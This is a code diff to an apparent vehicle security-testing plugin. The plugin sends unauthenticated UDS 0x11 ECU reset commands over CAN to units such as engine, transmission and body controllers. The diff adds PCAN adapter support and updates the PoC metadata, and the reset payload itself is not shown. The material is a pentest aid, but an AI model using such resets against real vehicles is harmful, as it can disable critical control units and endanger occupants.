@@ -1,13 +1,13 @@
 """
 PoC Name: UDS ECU Reset Unauthenticated (0x11)
 CVE: N/A
-Component: Canbus Stack
-Category: Canbus
+Component: UDS Protocol (ISO 14229)
+Category: Protocol
 Severity: High
 CVSS: 7.5
-Description: 在 UDS DefaultSession 下无需 SecurityAccess 认证，直接向目标 ECU 发送 0x11 SoftReset/HardReset 指令。覆盖 ECM/TCM/BCM/IC 等常见 ECU，全车通用
-Prerequisites: 激活的SocketCAN接口(如can0)及python-can支持
-Usage: python3 31_UDS_ECU_Reset_Unauth.py <args>
+Description: 在 UDS DefaultSession 下无需 SecurityAccess 认证，直接向目标 ECU 发送 0x11 SoftReset/HardReset 指令。
+Prerequisites: PCAN接口(如PCAN_USBBUS1), python-can库, PCAN驱动。
+Usage: python3 31_UDS_ECU_Reset_Unauth.py PCAN_USBBUS1
 """
 import sys
 import struct
@@ -80,7 +80,7 @@ class UDSECUResetPlugin(IVIVulnerabilityPlugin):
         self.interface = (
             self.params.get("can_interface") or
             self.params.get("interface") or
-            "can0"
+            "PCAN_USBBUS1"
         )
         # 默认只测试 SoftReset，安全性更高
         self.test_hard_reset = self.params.get("test_hard_reset", False)
@@ -93,7 +93,10 @@ class UDSECUResetPlugin(IVIVulnerabilityPlugin):
             return False
         # 验证 CAN 接口可用
         try:
-            bus = can.interface.Bus(channel=self.interface, bustype="socketcan")
+            if "PCAN" in self.interface:
+                bus = can.interface.Bus(channel=self.interface, interface="pcan", bitrate=500000)
+            else:
+                bus = can.interface.Bus(channel=self.interface, bustype="socketcan")
             bus.shutdown()
             self.logger.info(f"CAN 接口 {self.interface} 可用。")
             return True
@@ -173,7 +176,10 @@ class UDSECUResetPlugin(IVIVulnerabilityPlugin):
         iface = self.interface
 
         try:
-            bus = can.interface.Bus(channel=iface, bustype="socketcan")
+            if "PCAN" in iface:
+                bus = can.interface.Bus(channel=iface, interface="pcan", bitrate=500000)
+            else:
+                bus = can.interface.Bus(channel=iface, bustype="socketcan")
         except Exception as e:
             self.logger.error(f"无法打开 CAN 接口: {e}")
             self.results["evidence"] = f"CAN 接口 {iface} 打开失败: {e}"
